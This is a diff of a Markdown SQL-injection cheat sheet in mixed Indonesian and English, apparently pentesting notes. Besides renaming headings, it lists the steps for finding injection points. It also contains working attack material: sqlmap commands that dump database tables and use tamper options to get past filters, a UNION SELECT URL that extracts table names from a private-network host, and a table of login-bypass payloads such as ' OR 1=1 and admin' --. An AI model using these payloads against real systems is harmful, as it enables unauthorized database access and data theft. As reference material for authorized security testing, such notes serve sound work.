@@ -31,7 +31,7 @@
 `))
 ```
 
-## langkah-langkah
+## Steps
 1. Identifikasi DB yang digunakan, generate error atau show @@database
 2. Identify kapan dan dimana aplikasi akan berinteraksi dengan DB Server untuk mengakses data. Kondisi umum interaksi app dengan DB:
     - Authentication form, user dan password akan dicek pada database apakah ada atau tidak (kadang juga hash)
@@ -41,14 +41,13 @@
 3. Coba generate error pada entry point/parameter yang sudah dikumpulkan pada langkah sebelumnya menggunakan `'` (digunakan untuk memisahkan string) dan `;` (digunakan untuk mengakhiri kueri SQL)
 4. Coba meng-injek payload tanpa break query, bisa mengguna comment
 
-## SQLMap
+## Payload
 ```
     sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --dump
     sqlmap -u 'http://google.com' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' union-char=els --banner //Digunakan jika server blok spasi dan menggunakan commen '#'
     http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()— //extract table name
 ```
 
-## Payload
 |Payload|Payload alternatif|
 |---|---|
 |Logical True/false|`' OR 1=1` biasaya pake ini<br>`' OR 6=6`<br>`' OR 0x47=0x47`<br>`' OR char(32)=6''`<br>`' OR 6 is not null`<br>`admin' --`<br>`admin' #`<br>`admin'/*`<br>`' or 1=1--`<br>`' or 1=1#`<br>`' or 1=1/*`<br>`') or '1'='1--`<br>`') or ('1'='1--`|
